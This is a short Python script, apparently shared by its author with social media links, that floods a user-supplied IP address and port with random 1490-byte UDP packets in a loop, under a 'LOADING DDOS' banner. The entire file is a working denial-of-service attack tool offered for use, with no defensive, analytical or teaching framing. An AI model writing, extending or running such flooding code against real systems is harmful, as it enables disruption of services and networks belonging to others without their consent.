import sys, os, time, random, socket

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system('cls' if os.name == 'nt' else 'clear')


print("Author  : HA-MRX")
print("You Tube: https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
print("github  : https://github.com/Ha3MrX")
print("Facebook: https://www.facebook.com/muhamad.jabar222")

time.sleep(1.5)
os.system('cls' if os.name == 'nt' else 'clear')

ip = input("IP Target : ")
port = int(input("Port       : "))
amount = int(input("Amount of packages to send: "))


os.system("figlet Attack Starting")

os.system('cls' if os.name == 'nt' else 'clear')

loading= "LOADING DDOS\n"
bar = "[=====================]"
print(loading)
for c in bar:
    time.sleep(0.1)
    sys.stdout.write(c)
    sys.stdout.flush()

sent = 0


#sendung the packages
for i in range(int(amount)):
     sock.sendto(bytes, (ip,port))
     #add one
     sent+=1

     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
